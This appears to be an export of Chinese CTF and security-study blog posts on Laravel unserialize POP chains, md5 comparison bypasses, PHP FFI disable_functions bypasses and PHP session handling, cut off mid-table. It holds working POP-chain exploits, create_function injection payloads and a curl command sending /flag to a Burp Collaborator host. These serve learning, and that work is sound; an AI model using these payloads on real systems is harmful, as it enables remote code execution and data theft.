[{"categories":["NOTES\u0026SUMMARY"],"contents":"亲自从头到尾跟了一下涉及到的三个链子，稍微拯救了一点点点点我稀烂的代码审计能力\n参考链接放在文末\n 链子1 - 文件包含/任意文件读取 搜索__desturct()找入手点， vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php\n它调用了commit()和invalidateTags()\n调用pool的saveDeferred()方法，我们在这个类相同命名空间(Symfony\\Component\\Cache\\Adapter)下找有没有别的类也实现了这个方法，另外开始的那个pool是在Adapter接口下，所以要找一个AdapterInterface接口并且存在saveDeferred()的类\n找到这里vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php\n它又调用了initialize()，跟进 vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php\n是我们的文件包含点了，可以从这里读flag\n接下来就是构造exp了，要注意命名空间和接口\n前两个类都是Symfony\\Component\\Cache\\Adapter命名空间下的，但是CacheItem是Symfony\\Component\\Cache下的，所以要再引入它，use\n\u0026lt;?php namespace Symfony\\Component\\Cache{ final class CacheItem{ } } namespace Symfony\\Component\\Cache\\Adapter{ use Symfony\\Component\\Cache\\CacheItem; class PhpArrayAdapter{ private $file=\u0026#39;/flag\u0026#39;; } class TagAwareAdapter{ private $deferred; private $pool; public function __construct(){ $this-\u0026gt;deferred = array(\u0026#39;amiz\u0026#39; =\u0026gt; new CacheItem()); $this-\u0026gt;pool = new PhpArrayAdapter(); } } $a = new TagAwareAdapter(); echo urlencode(serialize($a)); } 链子2 - rce 回到前面在相同命名空间下找saveDeferred()的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php\n跟进doSave()\n223行可以动态调用函数，setInnerItem可控 我们可以调用system()，接下来确认它调用的两个参数可不可控\n对于$item，是调用函数doSave()函数时传入的参数，也就是saveDeferred()时的参数，也就是我们传入的数组，可控\n对于$innerItem有这样一个if判断\n光看这个判断肥肠的突兀，还要结合207行的$item = (array) $item;，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 protected的属性冲突，所以需要在相同的命名空间里接着找一个类，包含pollHash和innerItem属性，最终还是找到了CacheItem（前面也是它\n构造exp\n\u0026lt;?php namespace Symfony\\Component\\Cache{ final class CacheItem { protected $expiry; protected $poolHash; protected $innerItem; public function __construct($expiry, $poolHash, $command) { $this-\u0026gt;expiry = $expiry; $this-\u0026gt;poolHash = $poolHash; $this-\u0026gt;innerItem = $command; } } } namespace Symfony\\Component\\Cache\\Adapter{ class ProxyAdapter { private $poolHash; private $setInnerItem; public function __construct($poolHash, $func) { $this-\u0026gt;poolHash = $poolHash; $this-\u0026gt;setInnerItem = $func; } } class TagAwareAdapter { private $deferred = []; private $pool; public function __construct($deferred, $pool) { $this-\u0026gt;deferred = $deferred; $this-\u0026gt;pool = $pool; } } } namespace { $cacheitem = new Symfony\\Component\\Cache\\CacheItem(1,1,\u0026#34;dir\u0026#34;); $proxyadapter = new Symfony\\Component\\Cache\\Adapter\\ProxyAdapter(1,\u0026#39;system\u0026#39;); $tagawareadapter = new Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter(array($cacheitem),$proxyadapter); echo urlencode(serialize($tagawareadapter)); } 本地尝试一下（懒得再开靶机了w\n成功了捏\n链子3 - rce 在 [CISCN2019 总决赛 Day1 Web4]Laravel1这道题里赵师傅把这条路堵死了，但是本地复现无所谓啦\n把这个注释取消即可\n看到它调用了events的dispatch方法，跟上面思路一样，接着找一个可用的别的类里的dispatch，比如vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php\n看一下第一个判断的返回时调用的dispatchNow()是什么\n150行有亮点啊，使用了call_user_func，第一个参数可控，第二个参数来自$command，也就是最开始找的析构函数调用的$this-\u0026gt;event；现在要找一个类 可以执行任意函数作为第一个参数，然后我们的rce命令作为第二个参数传入，完成整个链子\n不过先不急，首先要满足dispatch()中的if判断$this-\u0026gt;queueResolver \u0026amp;\u0026amp; $this-\u0026gt;commandShouldBeQueued($command)，前一个可控，看看后面这个\n需要$command必须是一个实现了ShouldQueue接口的类，找到这个 vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php\n然后接着找适合做call_user_func()第一个参数的类，它需要可以执行任意函数 vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php\n这个load()可以直接调用eval执行代码，但是$defination要满足if的判断，跟进\n需要额外再找两个类，第一个类具有code属性，第二类又getName函数，来作为第一个类的config属性\n可用的第一个类就是getClassName()所在的类 vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php\n第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php\n总结以上的过程，写exp\n\u0026lt;?php namespace PhpParser\\Node\\Scalar\\MagicConst{ class Line {} } namespace Mockery\\Generator{ class MockDefinition { protected $config; protected $code; public function __construct($config, $code) { $this-\u0026gt;config = $config; $this-\u0026gt;code = $code; } } } namespace Mockery\\Loader{ class EvalLoader{} } namespace Illuminate\\Bus{ class Dispatcher { protected $queueResolver; public function __construct($queueResolver) { $this-\u0026gt;queueResolver = $queueResolver; } } } namespace Illuminate\\Foundation\\Console{ class QueuedCommand { public $connection; public function __construct($connection) { $this-\u0026gt;connection = $connection; } } } namespace Illuminate\\Broadcasting{ class PendingBroadcast { protected $events; protected $event; public function __construct($events, $event) { $this-\u0026gt;events = $events; $this-\u0026gt;event = $event; } } } namespace{ $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,\u0026#39;load\u0026#39;)); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast)); } ?\u0026gt;执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈\n这个链子非常的长，涉及到6个类\n pop链杀我！！！看代码有种目害的感觉了\n   以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（   Laravel POP链简析  Laravel5.8.x反序列化POP链\n ","date":"2021-12-04T14:11:02+08:00","permalink":"https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/","section":"posts","tags":["PHP","unserialize","laravel","gadget"],"title":"Laravel-5.8.x反序列化pop链学习"},{"categories":["NOTES\u0026SUMMARY"],"contents":" 写在开头：\n别纠结\n左侧的符号反转\u0026amp;标题是中文引号\u0026amp;有些符号消失\n的问题\n我也很无语\n寄。\n    md5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e   sha1绕过和md5绕过方式是一样的\n  md5($a)==md5($b) \u0026amp;\u0026amp; $a!=$b 数组绕过\n?a[]=1\u0026amp;b[]=2 0e绕过\nIHKFRNS -\u0026gt; 0e256160682445802696926137988570 QLTHNDT -\u0026gt; 0e405967825401955372549139051580 QNKCDZO -\u0026gt; 0e830400451993494058024219903391 3908336290 -\u0026gt; 0e807624498959190415881248245271 4011627063 -\u0026gt; 0e485805687034439905938362701775 4775635065 -\u0026gt; 0e998212089946640967599450361168 0e215962017 -\u0026gt; 0e291242476940776845150308577824 aabg7XSs -\u0026gt; 0e087386482136013740957780965295 aabC9RqS -\u0026gt; 0e041022518165728065344349536299 0e251288019 -\u0026gt; 0e874956163641961271069404332409 240610708 -\u0026gt; 0e462097431906509019562988736854 md5碰撞\na=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP md5($a)==md5(md5($b)) \u0026amp;\u0026amp; $a!=$b 数组绕过\na=\u0026amp;b[]=1 md5((string)$_GET[\u0026lsquo;a\u0026rsquo;])==md5(md5((string)$_GET[\u0026lsquo;b\u0026rsquo;])) \u0026amp;\u0026amp; $a!=$b 0e绕过，一个是正常0e，一个是第二次md5后还为0e的奇葩值\naawBzC aabsbm9 aaaabGG5T aaaabKGVH md5($a)==md5($b) \u0026amp;\u0026amp; !ctype_alpha($a) \u0026amp;\u0026amp; !is_numeric($b) 0e绕过，一个纯数字一个纯字母\n240610708 -\u0026gt; 0e462097431906509019562988736854 QNKCDZO -\u0026gt; 0e830400451993494058024219903391 md5($a)===md5($b) \u0026amp;\u0026amp; $a!=$b 数组绕过\n?a[]=1\u0026amp;b[]=2 md5($a)===md5(md5($b)) \u0026amp;\u0026amp; $a!=$b 数组绕过\n?a[]=1\u0026amp;b[]=2 md5($a)===md5($b) \u0026amp;\u0026amp; $a!==$b 数组绕过\n?a[]=1\u0026amp;b[]=2 $a!=hash(\u0026ldquo;md4\u0026rdquo;,$a) 0e纯数字绕过\n\u0026lt;?php for ($i = 0; ; $i++) { $r = \u0026#34;0e\u0026#34; . $i; $md4 = hash(\u0026#34;md4\u0026#34;, $r); if (preg_match(\u0026#34;/^0e[0-9]*$/\u0026#34;, $md4)) { echo (\u0026#34;md4加密前:\u0026#34;.$r).\u0026#34;\\n\u0026#34;; echo(\u0026#34;md4加密后：\u0026#34;.$md4); break; } } 0e251288019 -\u0026gt; 0e874956163641961271069404332409 md5($a)===md5($b) \u0026amp;\u0026amp; $a!==$b \u0026amp;\u0026amp; strlen($a)\u0026lt;=3 \u0026amp;\u0026amp; strlen($b)\u0026lt;=3 INF表示无穷大，而NAN表示一个在浮点数运算中未定义或不可表述的值；除了与True之外，拿NAN与其他任何值进行松散比较或者严格比较返回结果都是FALSE 因为他们都是不确定的值，所以在与自身做比较时，会返回false\nINF和NAN绕过\na=INF\u0026amp;b=INF a=NAN\u0026amp;b=NAN ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) 做题遇到的\n用原生类Error（php7）或Exception（php5 or 7），它有__toString方法，被触发后会以字符串形式输出当前保存情况，包括错误信息和当前报错的行号，而跟传入的参数没有关系；所以说可以构造两个类的实例，它们行号相同（被__toString调用后输出信息一样），但是本身不相同（传入参数不等）\n$str = \u0026#34;?\u0026gt;\u0026lt;?=include~\u0026#34;.urldecode(urlencode(~\u0026#39;/flag\u0026#39;)).\u0026#34;?\u0026gt;\u0026#34;;\t// 这个不重要 是那个题的payload $a=new Error($str,1);$b=new Error($str,2); $c = new SYCLOVER(); $c-\u0026gt;syc = $a; $c-\u0026gt;lover = $b; 注意$a和$b写到一行\n$this-\u0026gt;token === $this-\u0026gt;token_flag 指针取地址绕过\n$F-\u0026gt;token=\u0026amp;$F-\u0026gt;token_flag; ","date":"2021-12-03T00:24:56+08:00","permalink":"https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/","section":"posts","tags":["md5"],"title":"md5比较常见绕过小结"},{"categories":["NOTES\u0026SUMMARY"],"contents":"废话不多说，直接进入正题；文中参考链接统一扔后面了\nPreloading  PHP RFC: Preloading | php7.4启用  预加载文件到opcache中，类不能有不可达的父类、接口，also only top-level entities are not nested with control structures (e.g. if()\u0026hellip;)may be preloaded；被加载后除非重启，进行的修改不影响当前进程；预加载不影响静态类成员和变量的表现；Windows中不能预加载从内部继承的类（Windows ASLR and absence of fork() don\u0026rsquo;t allow to guarantee the same addresses of internal classes in different processes.）；多版本有可能造成bug\nFFI  PHP RFC: FFI - Foreign Function Interface | php7.4启用  文档中给了一个小栗子\n\u0026lt;?php // create FFI object, loading libc and exporting function printf() $ffi = FFI::cdef( \u0026#34;int printf(const char *format, ...);\u0026#34;, // this is regular C declaration  \u0026#34;libc.so.6\u0026#34;); // call C printf() $ffi-\u0026gt;printf(\u0026#34;Hello %s!\\n\u0026#34;, \u0026#34;world\u0026#34;); 直接运行即可输出Hello world!；这个函数的原型是这样的\nFFI::cdef([string $cdef = \u0026#34;\u0026#34; [, string $lib = null]]): FFI 书写的形式相当的简洁，创建FFI对象（声明）-\u0026gt;调用c方法；试着直接执行一个whoami\nphp -r \u0026#39;$ffi = FFI::cdef(\u0026#34;int system(char *command);\u0026#34;);$ffi-\u0026gt;system(\u0026#34;whoami\u0026#34;);\u0026#39; 发现在没有第二个参数的情况下也可以正常执行system函数，看下源码\n这种情况下lib=NULL，handle=RTLD_DEFAULT（这个注释TODO就很灵性）\n随后调用DL_FETCH_SYMBOL，也就是dlsysm\n RTLD_DEFAULT\nFind the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the RTLD_GLOBALflag.\n 当dlsym第一个参数为RTLD_DEFAULT时，会按照默认共享库顺序查找system的位置，搜索范围还包括了可执行程序极其依赖中的函数表（如果设置了 RTLD_GLOBAL还会搜索动态加载库中的函数表），也就是直接在全局符号表里找了，所以不需要指定加载库，fopen这类函数也是一样\n更多的栗子请参见文档和这一篇文章，写的都很详细\n跑个题：FFI in Python Python的优点就不必说了，缺点是封装太好了导致运行速度上不去，那为什么不直接在Python中用C/C++呢？\n肥肠不错的想法！不过要解决的有两个问题：Marshalling（感觉编组这个翻译很奇怪 但是这个行为可以类比一下serialize） \u0026amp; Manageing Memory（内存管理）\n Python中万物皆object，而C中有严格的int float等等类型 Python有gc，而C中需要手动malloc  不过不急，已经有库封装好了这些功能可以直接使用，来康康demo\nctypes库 #include \u0026lt;stdio.h\u0026gt; float cadd(int x, float y) { float res = x + y; printf(\u0026#34;In cadd: int %d float %.1f returning %.1f\\n\u0026#34;, x, y, res); return res; } import ctypes import pathlib if __name__ == \u0026#34;__main__\u0026#34;: # load the lib libname = pathlib.Path().absolute() / \u0026#34;libcadd.so\u0026#34; c_lib = ctypes.CDLL(libname) x, y = 6, 2.3 # define the return type c_lib.cadd.restype = ctypes.c_float # call the function with the correct argument types res = c_lib.cadd(x, ctypes.c_float(y)) print(f\u0026#34;In python: int: {x}float {y:.1f}return val {res:.1f}\u0026#34;) $ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c $ python3 test.py In cadd: int 6 float 2.3 returning 8.3 In python: int: 6 float 2.3 return val 8.3 可以看到成功调用了cadd.so，而我们在python中要做的只有加载.so-\u0026gt;设置符合C标准的返回值类型-\u0026gt;调用，肥肠的简单\n不过标准库ctypes有一些缺陷 并且不能拓展大型项目，鉴于此我们可以使用cffi库\ncffi库 这里是一个hello world的小demo\nfrom cffi import FFI ffi = FFI() # 可以定义函数 结构体 变量 ffi.cdef(\u0026#34;\u0026#34;\u0026#34; int printf(const char *format, ...); \u0026#34;\u0026#34;\u0026#34;) c = ffi.dlopen(None) # 加载c命名空间 arg = ffi.new(\u0026#34;char[]\u0026#34;, b\u0026#34;world\u0026#34;) # 即 char arg[]=\u0026#34;world\u0026#34;; c.printf(b\u0026#34;hello %s\\n\u0026#34;, arg) 这个栗子里直接在一个py文件中用cffi调用库函数就结束了，肥肠肥肠的简单；或者也可以和ctypes一样，单独写一个c先\n#include \u0026lt;stdio.h\u0026gt;int Tadd(int a, int b){ int c; c = a+b; return c; } void Tprint(void){ printf(\u0026#34;hello, world\\n\u0026#34;); } int Tmul(int a, int b){ return a*b; } 然后调用ffi.verify()在Python中加载和使用，不过还需要额外声明函数\nfrom cffi import FFI ffi = FFI() ffi.cdef(\u0026#34;\u0026#34;\u0026#34; int Tadd(int a, int b); void Tprint(void); int Tmul(int a, int b); \u0026#34;\u0026#34;\u0026#34;) lib = ffi.verify(sources=[\u0026#39;uu.c\u0026#39;]) print(lib.Tadd(10, 2)) lib.Tprint() print(lib.Tmul(3, 5)) 以上方式都是在线api模式，cffi还支持离线api模式，比如下面这个demo\nfrom cffi import FFI ffibuilder = FFI() ffibuilder.cdef(\u0026#34;\u0026#34;\u0026#34; double sqrt(double x); \u0026#34;\u0026#34;\u0026#34;) # 需要的头文件 ffibuilder.set_source(\u0026#34;_libmath\u0026#34;, \u0026#34;\u0026#34;\u0026#34; #include \u0026lt;math.h\u0026gt; \u0026#34;\u0026#34;\u0026#34;, library_dirs = [], libraries = [\u0026#39;m\u0026#39;] ) ffibuilder.compile(verbose=True) python build_cffi.py from _libmath import lib # 直接调用c函数 x = lib.sqrt(4.5) print(F\u0026#34;The square root of 4.5 is {x}.\u0026#34;) python test.py 可以看到这里先用一个py文件调用.h来编译生成.so和.c，然后在另一个py文件中调用.c即可\n或者还有第三种方式，在Python中使用外部已经定义好的c库函数；这里使用wolever/python-cffi-example来演示（就不复制粘贴了捏 就粘就粘\n首先是一个fnmatch.h\n注意7 8 9行要改一下的，根据/usr/include/fnmatch.h改\n这是build_fnmatch.py，用于生成模块在fnmatch.py中使用\nimport os from cffi import FFI ffi = FFI() ffi.set_source(\u0026#34;cffi_example._fnmatch\u0026#34;, # Since we are calling fnmatch directly no custom source is necessary. We # need to #include \u0026lt;fnmatch.h\u0026gt;, though, because behind the scenes cffi # generates a .c file which contains a Python-friendly wrapper around # ``fnmatch``: # static PyObject * # _cffi_f_fnmatch(PyObject *self, PyObject *args) { # ... setup ... # result = fnmatch(...); # return PyInt_FromLong(result); # } \u0026#34;#include \u0026lt;fnmatch.h\u0026gt;\u0026#34;, # The important thing is to inclue libc in the list of libraries we\u0026#39;re # linking against: libraries=[\u0026#34;c\u0026#34;], ) with open(os.path.join(os.path.dirname(__file__), \u0026#34;fnmatch.h\u0026#34;)) as f: ffi.cdef(f.read()) if __name__ == \u0026#34;__main__\u0026#34;: ffi.compile() 一个setup.py\n#!/usr/bin/env python import os import sys from setuptools import setup, find_packages os.chdir(os.path.dirname(sys.argv[0]) or \u0026#34;.\u0026#34;) setup( name=\u0026#34;cffi-example\u0026#34;, version=\u0026#34;0.1\u0026#34;, classifiers=[ \u0026#34;Development Status :: 4 - Beta\u0026#34;, \u0026#34;Programming Language :: Python :: 2\u0026#34;, \u0026#34;Programming Language :: Python :: 3\u0026#34;, \u0026#34;Programming Language :: Python :: Implementation :: PyPy\u0026#34;, \u0026#34;License :: OSI Approved :: BSD License\u0026#34;, ], packages=find_packages(), install_requires=[\u0026#34;cffi\u0026gt;=1.0.0\u0026#34;], setup_requires=[\u0026#34;cffi\u0026gt;=1.0.0\u0026#34;], cffi_modules=[ \u0026#34;./build_fnmatch.py:ffi\u0026#34;, ], ) 最后的cffi_modules指定了需要生成ffi实例的文件\npyhon setup.py install 没想到是个报错，仔细看一下原因，解决方法是把之前的fnmatch.h中的偏移换成16进制\n再次执行就好了\n可以看到这种方式比之前生成的文件都要多，相当于安装了一个模块\n然后是一个test_fnmatch.py，注意这里直接用给出的文件还是会报错，把下图高亮的地方换成0x1\n再执行就好了\ncffi和ctypes还有很多的花活，鉴于我的代码能力一般（c和python都是勉强够用的水平），就不班门弄斧了，更多的东西还是看官方文档比较靠谱（链接贴在最后了\n————什么？为什么FFI in PHP介绍的还不如FFI in Python的多？\nemmmmm 这个嘛 才不会说是因为懒呢\nSerializable  PHP RFC: New custom object serialization mechanism | php7.4启用  已有的反序列化魔术方法总是有很多安全问题，这个提议新增了__serialize()，__unserialize()，serialize()，unserialize()和Serializable()\nserialize()检查到__serialize()的存在后将在序列化之前优先执行，返回序列化形式的数组，如有错抛出TypeError；如果同时有__serialize()和__sleep()，后者将被忽略；如果对象实现了Serializable()接口，接口的serialize()将被忽略，类中的__serialize()将被调用；反序列化时触发__unserialize()\n————好勾八复杂的，建议直接看文档\n[RCTF 2019]Nextphp \u0026lt;?php final class A implements Serializable { protected $data = [ \u0026#39;ret\u0026#39; =\u0026gt; null, \u0026#39;func\u0026#39; =\u0026gt; \u0026#39;print_r\u0026#39;, \u0026#39;arg\u0026#39; =\u0026gt; \u0026#39;1\u0026#39; ]; private function run () { $this-\u0026gt;data[\u0026#39;ret\u0026#39;] = $this-\u0026gt;data[\u0026#39;func\u0026#39;]($this-\u0026gt;data[\u0026#39;arg\u0026#39;]); } public function __serialize(): array { return $this-\u0026gt;data; } public function __unserialize(array $data) { array_merge($this-\u0026gt;data, $data); $this-\u0026gt;run(); } public function serialize (): string { return serialize($this-\u0026gt;data); } public function unserialize($payload) { $this-\u0026gt;data = unserialize($payload); $this-\u0026gt;run(); } public function __get ($key) { return $this-\u0026gt;data[$key]; } public function __set ($key, $value) { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } public function __construct () { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } } 如果熟读以上三个文档，这个题就很好出了\n我们可以把func设为FFI:cdef，arg设为int system(char *command)来执行c代码绕过php.ini中的限制；同时由于Serializable的种种新特性（出题人也在这里设了坑），我们在构造poc时要删除__serialize()，防止直接return进坑里了\n\u0026lt;?php final class A implements Serializable { protected $data = [ \u0026#39;ret\u0026#39; =\u0026gt; null, \u0026#39;func\u0026#39; =\u0026gt; \u0026#39;FFI::cdef\u0026#39;, \u0026#39;arg\u0026#39; =\u0026gt; \u0026#39;int system(char *command);\u0026#39; ]; private function run () { $this-\u0026gt;data[\u0026#39;ret\u0026#39;] = $this-\u0026gt;data[\u0026#39;func\u0026#39;]($this-\u0026gt;data[\u0026#39;arg\u0026#39;]); } public function serialize (): string { return serialize($this-\u0026gt;data); } public function __unserialize(array $data) { array_merge($this-\u0026gt;data, $data); $this-\u0026gt;run(); } public function unserialize($payload) { $this-\u0026gt;data = unserialize($payload); $this-\u0026gt;run(); } public function __get ($key) { return $this-\u0026gt;data[$key]; } public function __set ($key, $value) { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } public function __construct () { echo \u0026#39;start\u0026#39;.\u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; } } $a = new A(); echo base64_encode(serialize($a)); 随后在传入的地方执行unserialize(base64_decode(payload))-\u0026gt;__serialize()['ret']-\u0026gt;system(command);，直接curl外带flag\n?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-\u0026gt;__serialize()['ret']-\u0026gt;system(\u0026quot;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net\u0026quot;); ————在这个题出现之后蚁剑还专门出了对应的插件\n但是多次尝试失败，之后看到了这个wp之后再看官方文档还有这一篇就明白了\n默认情况下FFI只会被用于CLI模式下\u0026amp;预加载php脚本，除非设置ffi.enable=true，设置之后在webshell就可以直接用蚁剑插件了\n[极客大挑战 2020]Roamphp5-FighterFightsInvincibly 很漂亮的前端，看页面源码有注释的提示\n这个形式，真的是一眼create_function()了，看一下phpinfo()，用的还是create_function()的注入\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}phpinfo();/* 看下disable_function\nsystem,exec,shell_exec,passthru,proc_open,proc_close,\u0026amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,\u0026amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,\u0026amp;nbsp;socket_connect,\u0026amp;nbsp;stream_socket_server,\u0026amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,\u0026amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,\u0026amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,\u0026amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,\u0026amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,\u0026amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,\u0026amp;nbsp;posix_getrlimit,\u0026amp;nbsp;posix_getsid,posix_getuid,posix_isatty,\u0026amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,\u0026amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname\u0026lt;/td\u0026gt;\u0026lt;td class=\u0026quot;v\u0026quot;\u0026gt;system,exec,shell_exec,passthru,proc_open,proc_close,\u0026amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,\u0026amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,\u0026amp;nbsp;socket_connect,\u0026amp;nbsp;stream_socket_server,\u0026amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,\u0026amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,\u0026amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,\u0026amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,\u0026amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,\u0026amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,\u0026amp;nbsp;posix_getrlimit,\u0026amp;nbsp;posix_getsid,posix_getuid,posix_isatty,\u0026amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,\u0026amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname 直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着\n看到这里ffi.enable=On，符合蚁剑插件的应用条件，写个webshell试试\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}eval($_POST[wuhu]);/* what\u0026rsquo;s up，竟然没有回显\n尝试ping，发现还不出网，不能用curl外带flag\n那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果\nFILE *popen(const char* command,const char* type); popen会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数的命令，type有r(read)和w(write)，依照这个值popen会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}$ffi = FFI::cdef(\u0026quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);\u0026quot;,\u0026quot;libc.so.6\u0026quot;);$o = $ffi-\u0026gt;popen(\u0026quot;ls / -lah\u0026quot;,\u0026quot;r\u0026quot;);$d = \u0026quot;\u0026quot;;while(($c = $ffi-\u0026gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,\u0026quot;0\u0026quot;,0);}$ffi-\u0026gt;pclose($o);echo hex2bin($d);/* 另一种方法是调用php源码中的函数php_exec()，当它的参数type为3时对应调用的是passthru()函数，其执行命令可以将结果原始输出\n?fighter=create_function\u0026amp;fights=\u0026amp;invincibly=;}$ffi = FFI::cdef(\u0026quot;int php_exec(int type, char *cmd);\u0026quot;);$ffi-\u0026gt;php_exec(3,\u0026quot;ls /\u0026quot;);/* 但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了\n 最近在刷buuoj，有望这个月内把50解以上的题做完捏\n   以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（   PHP RFC: Preloading | PHP RFC: FFI - Foreign Function Interface | PHP RFC: New custom object serialization mechanism | PHP FFI详解 - 一种全新的PHP扩展方式\nDo You Hate How Slow Python Is? This Is How You Can Make It Run Faster! | Make Python Faster with CFFI Python Bindings\nCFFI documentation | ctypes documentation\nPython cffi学习  | cffi-example: an example project showing how to use Python\u0026rsquo;s CFFI\nwp | wp2\n ","date":"2021-12-03T00:01:07+08:00","permalink":"https://amiaaaz.github.io/2021/12/03/use-ffi-bypass-disable-functions/","section":"posts","tags":["PHP","unserialize","FFI","bypass_disable_functions"],"title":"FFI绕过disable_functions"},{"categories":["NOTES\u0026SUMMARY"],"contents":"提到session，能想到什么捏？文件上传，条件竞争，session包含，反序列化…… 让我们一点点说\n session配置\u0026amp;简述 以7.4.3为例，php.ini中关于Session有几个默认项\n  session.auto_start = 0：默认不启动session，*但是可以在php脚本中手动执行session_start()\n  session.save_handler = files：session以文件形式存储\n  session.save_path=\u0026quot;\u0026quot;：session文件存储路径 文件名为sess_PHPSESSID\nlinux下默认存储位置；*可以被修改\n/var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /var/lib/php5/sess_PHPSESSID /var/lib/php5/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID   session.serialize_handler = php：session的默认序列化引擎是php\n其实一共有3种，*php和php_serialize这两种是很多题的元凶\n   序列化引擎 存储方式     php 键名|序列化后字符串   php_binary 